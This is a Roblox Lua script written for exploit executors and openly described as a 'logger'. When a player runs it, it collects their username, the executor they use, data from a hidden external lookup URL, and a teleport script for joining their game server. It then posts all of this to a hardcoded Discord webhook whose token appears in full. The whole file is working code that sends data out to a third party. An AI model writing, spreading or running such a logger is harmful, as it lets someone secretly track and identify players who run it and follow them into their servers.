local join_script = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s', game:GetService('Players').LocalPlayer)", game.PlaceId, game.JobId)
print(helo) --line above generates a script that allows u to join the logged user

--checks executor
local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1346273624356552795/n7ZgeTc-2NVhkFRM5XU6yn40UIcvNiWb6UO5K30pYSgeOQUn6N4joHtZhYi4QvYPpUs9"
local data = {
            ["username"] = "Cooked", --webhook name thing idk
            ["avatar_url"] = "https://[Log in to view URL]", --avatar image url
    
    ["content"] = " @everyone **" ..game.Players.LocalPlayer.Name.. "** just ran your logger", --normal message
    ["embeds"] = {
       {
           ["title"] = "** " ..game.Players.LocalPlayer.Name.. " just ran your logger**",
           ["description"] = "**"..game:HttpGet("http://[Log in to view URL]").. "Username: "  ..game.Players.LocalPlayer.Name..", Uses: " ..webhookcheck.. "**",
           ["type"] = "rich", --line above sends all the info grabbed using the api + username and exacutor
           ["color"] = 14680319,
           ["footer"] = {
             ["text"] = "" ..join_script.. "", --sends join script
           },
       },
   }
}

local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef) --post, idk
